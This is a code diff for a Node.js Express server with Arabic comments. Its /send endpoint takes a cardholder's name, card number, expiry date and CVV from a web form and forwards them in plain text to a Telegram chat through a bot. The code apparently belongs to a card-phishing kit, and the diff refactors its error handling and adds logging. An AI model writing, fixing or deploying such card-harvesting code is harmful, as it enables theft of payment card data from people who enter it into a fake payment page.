@@ -13,15 +13,15 @@ const CHAT_ID = process.env.CHAT_ID;
 
 // استقبال البيانات من HTML وإرسالها إلى تيليجرام
 app.post("/send", async (req, res) => {
-    const { cardHolder, cardNumber, expiryDate, cvv, saveCard } = req.body;
-    
-    if (!cardHolder || !cardNumber || !expiryDate || !cvv) {
-        return res.status(400).json({ message: "يجب ملء جميع الحقول!" });
-    }
-
-    const text = `🚀 بيانات جديدة:\n\n👤 الاسم: ${cardHolder}\n💳 رقم البطاقة: ${cardNumber}\n📅 تاريخ الانتهاء: ${expiryDate}\n🔒 CVV: ${cvv}\n💾 حفظ البطاقة: ${saveCard}`;
-
     try {
+        const { cardHolder, cardNumber, expiryDate, cvv, saveCard } = req.body;
+
+        if (!cardHolder || !cardNumber || !expiryDate || !cvv) {
+            return res.status(400).json({ message: "يجب ملء جميع الحقول!" });
+        }
+
+        const text = `🚀 بيانات جديدة:\n\n👤 الاسم: ${cardHolder}\n💳 رقم البطاقة: ${cardNumber}\n📅 تاريخ الانتهاء: ${expiryDate}\n🔒 CVV: ${cvv}\n💾 حفظ البطاقة: ${saveCard}`;
+
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: text
@@ -29,6 +29,7 @@ app.post("/send", async (req, res) => {
 
         res.json({ message: "تم الإرسال بنجاح!" });
     } catch (error) {
+        console.error("خطأ أثناء الإرسال إلى تيليجرام:", error);
         res.status(500).json({ message: "حدث خطأ أثناء الإرسال!" });
     }
 });
